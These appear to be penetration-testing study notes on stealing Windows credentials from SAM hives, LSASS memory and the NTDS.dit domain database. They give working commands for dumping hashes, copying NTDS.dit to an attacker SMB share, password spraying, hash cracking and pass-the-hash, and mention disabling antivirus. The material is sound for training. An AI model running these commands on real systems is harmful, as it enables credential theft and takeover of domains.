# Attacking SAM

- When accessing a non-domain joined Windows system, it may help to immediately dump the SAM hive to our attack host and start cracking hashes offline.
	- Doing this soffline ensures tthat we can continue attacks without maintaining an active session

#### Copying SAM Registry Hives
- 3 registry hives
	- `hklm\sam` - Contains hashes for local account passwords.
	- `hklm\system` - Contains the system bootkey which is used to encrypt the SAM db.
	- `hklm\security` - Contains cached credentials for domain accounts.

#### Using reg.exe to Copy Registry Hives
- `reg.exe save hklm\sam C:\sam.save`
- `reg.exe save hklm\system C:\system.save`
- `reg.exe save hklm\security C:\security.save`

- Transfer using smbserver.py to attack host

#### Dumping Hashes with secretsdump.py
- `locate secretsdump`
- `python3 /path/to/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
	- Used local because this host is not part of a domain
- Modern Windows store the password as an NT hash
	- Versions older than Vista/Server 2008 store passwords as an LM hash

#### Cracking Hashes with Hashcat
- Add nt hashes to a text file, one per line
- `sudo hashcat -m 1000 <hashes>.txt /path/to/wordlist`

#### Remote Dumping & LSA Secrets Considerations
- Requires credentials with local admin privs

- **Dump LSA Secrets Remotely**
	- `crackmapexec smb <ip> --local-auth -u <user> -p <pass> --lsa`
- **Dumping SAM Remotely**
	-  `crackmapexec smb <ip> --local-auth -u <user> -p <pass> --sam`

# Attacking LSASS

![[Pasted image 20230326204042.png | 700]]

- On initial logon LSASS will
	- Cache credentials locally in memory
	- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
	- Enforce security policies
	- Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

#### Dumping LSASS Process Memory - Task Manager
- With an interactive GUI session we can use task manager to create a memory dump
- Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
	- A file called `lsass.DMP` is created in `C:\Users\<USER>\AppData\Local\Temp`

#### Dumping LSASS Memory - Rundll32.exe & Comsvcs.dll
- If we don't have a GUI session we can use `rundll32.exe` to dump LSASS.
	- Modern AV will detect this

- **Find LSASS PID in cmd**
	- `tasklist /svc` and find lsass.exe and its PID
- **Find LSASS PID in Powershell**
	- `Get-Process lsass`

- **Creating lsass.dmp in PowerShell**
	- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full`
- **This will trigger AV and be blocked. We need to bypass or disable AV to use this method.**

#### Using Pypykatz to Extract Credentials
- `pypykatz lsa minidump /path/to/lsass.dmp`

### LSASS Dump Credential Contents
- **MSV** 
	- An authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Contains NT hashes
- **WDIGEST** 
	- Older auth protocol that stored passwords in cleartext. Enabled by default on Windows XP - Win 8 and Windows server 2003 - 2012
- **Kerberos** 
	- Network authentication protocol used by Active Directory in Windows Domain environments. LSASS caches passwords, ekeys, ticks and pins. These can be used for lateral movement
- **DPAPI**
	- Data Protection Application Programming Interface (DPAPI). Used for encrypting and decrypting and has a master key for that. This can be used to extract secrets from Chrome, Internet Explorer, Outlook, etc...

# Attacking Active Directory & NTDS.dit

![[Pasted image 20230326220644.png|700]]
- Mitre: [OS Credential Dumping - NTDIS](https://attack.mitre.org/techniques/T1003/003/)

- Once a Windows system joins a domain, it no longer defaults to referencing the SAM to validate logons.
	- All auth request must be validated by the DC before login.
- The SAM can still be used to log in local user accounts by specifying the hostname and username (ex: `Computer/user`) or `./` in the username gui login field

#### Dictionary Attacks against AD with CrackMapExec
- Dictionary attacks are noisy so we should custom tailor our attack to reduce the footprint as much as possible.
- Using OSINT on social media or company websites can give us the names of employees of an organization
- Many orgs follow a naming convention when creating employee usernames:

![[2023-03-26 22_13_54-Hack The Box - Academy.png|700]]
- Often an email adress structure will give us the employee's username.
- If an org obfuscates employees emails using aliases, try google dorks to search for "company.com filetype:pdf" and find valid usernames in the PDF properties if they were generated using a graphics editor.

- **Creating a Custom Username list with [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)**
	- We can give it a list of names and it will generate many potential usernames from it
		- `./username-anarchy -i names.txt `

- **Launching the Attack with CrackMapExec**
	- `crackmapexec smb <IP> -u <user> -p /usr/share/wordlists/fasttrack.txt`
- This could lock out the account we are targeting.
- As of Jan 2022 an account lockout policy is not enforced by default with the Windows domain default group policies.

- **Event Log from the Attack**
	- On any Windows system, admins can use Event Viewer to view Security events. ![[Pasted image 20230326222329.png|700]]
## Capturing NTDS.dit
### Manual Method
- NTDS is the directory service used with Active Directory.
	- This is the _primary_ AD databasse and stores all domain usernames, password hashes, and other critical schema information.
	- Stored in `$systemroot$/ntds`

- **Connect to DC with Evil-WinRM**
	- Use captured creds to winrm in
		- `evil-winrm -i <ip> -u <user> -p <pass>`
- **Check Local Group Membership**
	- `net localgroup` - local groups
	- `net user <user>` - domain groups
	- We are looking for local admin rights (Administrators Group) or domain admin (Domain Admins group)
- **Create Shadow Copy of C:**
	- We can use `vssadmin` to create a Volume Shadow Copy. It's likely that NTDS will be on C: because its the default location.
	- VSS is used because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down.
		- `vssadmin CREATE SHADOW /FOR=C:`
- **Copy NTDS.dir from the VSS**
	- We can copy it out of the shadow copy of c: to prepare for exfiltration.
		- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS.dit`
- **Transfer To Attack Host**
	- Spin up smbserver `smbserver.py -smb2support Share .`
	- `cmd.exe /c move C:\NTDS.dit \\<IP>\Share`
### CrackMapExec Method
- Simply run
	- `crackmapexec smb <IP> -u <user> -p <pass> --ntds`

- Try cracking the hashes
- If we are unable to crack a hash we can still use it in a Pass-the-Hash attack.
- Pass-The-Hash evil-winrm example
	- `evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`